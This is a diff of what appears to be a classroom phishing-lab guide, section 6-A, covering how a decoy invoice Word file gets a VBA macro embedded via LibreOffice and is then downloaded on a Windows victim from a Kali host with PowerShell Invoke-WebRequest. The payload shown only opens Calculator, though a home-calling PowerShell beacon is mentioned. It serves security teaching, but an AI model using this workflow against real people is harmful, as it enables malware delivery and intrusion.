@@ -354,13 +354,13 @@ Show students side-by-side: real site vs cloned — they look identical.
 
 ### 6-A · Macro document (concept + demo)
 
-**Terminal 4**
+**Attacker — Terminal 4 (Kali)**
 
 ```bash
-# Create the decoy Word doc and print the VBA macro
+# Generate the macro code and decoy document
 python3 tools/create_macro_doc.py
 
-# Read the macro code together with students
+# Walk through the VBA with students
 cat payloads/macro_code.vba
 ```
 
@@ -369,21 +369,31 @@ Walk through the VBA line by line:
 - `Shell "cmd.exe /c calc.exe"` — the "payload" (harmless here)
 - The PowerShell beacon line — how it calls home
 
-**On Windows victim (demonstrate the attachment flow):**
+**Attacker — prepare the .docm on Kali using LibreOffice:**
+```bash
+# Open LibreOffice Writer
+libreoffice --writer payloads/invoice_Q4_2024.docx
 ```
-1. Transfer payloads/invoice_Q4_2024.docx to Windows
-   (drag-drop, shared folder, or:)
 ```
+Inside LibreOffice:
+1. Tools → Macros → Edit Macros
+2. Paste content of payloads/macro_code.vba into Module1
+3. File → Save As → invoice_Q4_2024.docm (keep current format)
+```
+
+The attacker now has a `.docm` with the macro embedded — ready to send.
+
+**Victim — receives and opens the document:**
 ```powershell
-# On Windows — download it from Kali
-Invoke-WebRequest -Uri "http://$KALI_IP:8080/payloads/invoice_Q4_2024.docx" `
-                  -OutFile "$env:TEMP\invoice_Q4_2024.docx"
+# On Windows — download the prepared document from Kali
+Invoke-WebRequest -Uri "http://192.168.11.149:8080/payloads/invoice_Q4_2024.docm" `
+                  -OutFile "$env:TEMP\invoice_Q4_2024.docm"
 ```
 ```
-2. Open the file → "Enable Content" button appears
-3. Alt+F11 → paste macro_code.vba into ThisDocument → save as .docm
-4. Reopen → click Enable Content → Calculator opens
-5. Check %TEMP%\macro_ran.txt
+1. Open invoice_Q4_2024.docm
+2. Click "Enable Content" when prompted
+3. Calculator opens automatically — macro executed
+4. Check %TEMP%\macro_ran.txt
 ```
 
 ### 6-B · PowerShell download cradle
